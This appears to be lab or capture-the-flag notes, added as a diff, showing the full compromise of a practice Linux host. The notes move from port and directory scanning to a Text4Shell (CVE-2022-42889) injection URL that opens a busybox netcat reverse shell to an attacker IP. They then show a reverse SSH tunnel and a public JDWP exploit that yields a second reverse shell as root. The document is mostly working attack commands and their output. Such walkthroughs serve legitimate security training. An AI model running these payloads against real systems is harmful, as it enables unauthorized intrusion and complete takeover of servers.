@@ -1,0 +1,85 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.224.150 > Berlin150.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
+|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
+8080/tcp open  http    Apache Tomcat (language: en)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-favicon: Spring Java Framework
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ gobuster dir -u http://192.168.224.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+search
+CHANGELOG
+$ curl http://192.168.224.150:8080/CHANGELOG
+# Changelog
+Version 0.2
+- Added Apache Commons Text 1.8 Dependency for String Interpolation
+Version 0.1
+- Initial beta version based on Spring Boot Framework
+- Added basic search functionality
+
+
+Apache Commons Text 1.8
+Text4ShellText4Shell (CVE-2022-42889)
+
+curl http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.218%204444%20-e%20sh%27%29%7D%25
+
+# For port 8080 sometimes it is in Docker container or minimal Java environment. BusyBox is often called the "The Swiss Army Knife of Embedded Linux." It is a single, highly compact executable that contains stripped-down versions of hundreds of common UNIX utilities (like ls, cat, grep, nc, ping, etc.). In modern, lightweight production containers, administrators don't install standard networking tools. However, because the container template was built on a minimal image like Alpine, busybox was pre-installed, giving you an alternative way to access Netcat.
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.218] from (UNKNOWN) [192.168.224.150] 38678
+id
+uid=1001(dev) gid=1001(dev) groups=1001(dev)
+
+Linux version 5.15.0-52-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+127.0.0.1:8000
+Sudo version 1.9.9
+
+netstat -ano
+127.0.0.1:8000
+ps -auxw
+root         859  0.0  1.7 2528964 34716 ?       Ssl  00:01   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y
+
+$ searchsploit jdwp
+Java Debug Wire Protocol (JDWP) - Remote Code Exe | java/remote/46501.py
+ 
+dev@oscp:/tmp$ ssh -f -N -R 8000:localhost:8000 alan@192.168.45.218 # -f (Go to Background) -N (Do Not Execute Commands) -R (Remote Port Forwarding) Bind local port 8000 to Kali localhost port 8000
+
+$ python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.218 9999 -e sh'
+[+] Targeting '127.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
+[+] Found Runtime class: id=84e
+[+] Found Runtime.getRuntime(): id=7f395402e0e8
+[+] Created break event id=2
+[+] Waiting for an event on 'java.net.ServerSocket.accept'
+[+] Received matching event from thread 0x8ea
+[+] Selected payload 'busybox nc 192.168.45.218 9999 -e sh'
+[+] Command string object created id:8eb
+[+] Runtime.getRuntime() returned context id:0x8ec
+[+] found Runtime.exec(): id=7f395402e120
+[+] Runtime.exec() successful, retId=8ed
+[!] Command successfully executed
+
+$ rlwrap nc -nlvp 9999 
+listening on [any] 9999 ...
+
+dev@oscp:/tmp$ ss -nltp # verified port 5000 was open and connected to it to trigger the event
+LISTEN 0      50                 *:5000            *:*    users:(("java",pid=859,fd=10)) 
+
+dev@oscp:/$ nc 127.0.0.1 5000 # Trigger the connection
+
+$ rlwrap nc -nlvp 9999 
+listening on [any] 9999 ...
+connect to [192.168.45.218] from (UNKNOWN) [192.168.224.150] 59816
+id
+uid=0(root) gid=0(root)
+
+
+
+
